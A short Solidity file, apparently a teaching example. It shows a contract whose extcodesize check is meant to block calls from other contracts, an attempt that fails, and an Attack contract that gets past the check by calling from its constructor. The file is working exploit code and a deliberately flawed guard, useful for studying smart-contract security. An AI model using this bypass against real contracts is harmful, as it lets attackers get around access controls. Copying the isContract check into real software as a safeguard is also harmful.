// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Target {
    bool public pwned = false;

    function isContract(address _address) public view returns (bool) {
        uint codeSize;
        assembly {
            codeSize := extcodesize(_address)
        }
        return codeSize != 0;
    }

    function protected() external {
        require(!isContract(msg.sender), "Can't be contract");
        pwned = true;
    }
}

contract FailedAttack {
    
    function pwn(address _targetAddress) external {
        Target(_targetAddress).protected();
    }
}

contract Attack {

    constructor(address _targetAddress) {
        Target(_targetAddress).protected();
    }
}